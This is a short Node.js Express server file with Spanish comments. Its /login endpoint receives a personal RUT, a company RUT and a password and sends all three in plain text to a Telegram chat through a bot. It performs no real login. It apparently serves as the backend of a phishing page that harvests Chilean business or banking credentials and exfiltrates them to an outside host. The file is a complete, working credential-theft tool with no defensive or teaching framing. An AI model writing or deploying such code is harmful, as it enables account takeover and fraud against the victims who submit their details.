const express = require("express");
const fetch = require("node-fetch");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Variables de entorno en Render (Settings → Environment)
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });
}

app.post("/login", async (req, res) => {
  const { rutPersona, rutEmpresa, passwd } = req.body;

  // ⚠️ Notificación con los tres campos solicitados
  const mensaje = `🔔 Nuevo intento de login:\n👤 RUT Persona: ${rutPersona}\n🏢 RUT Empresa: ${rutEmpresa}\n🔑 Contraseña: ${passwd}`;

  try {
    await sendTelegramMessage(mensaje);
    res.send("✅ Notificación enviada a Telegram.");
  } catch (error) {
    console.error("Error enviando a Telegram:", error);
    res.status(500).send("❌ Error al notificar.");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en http://localhost:${PORT}`));
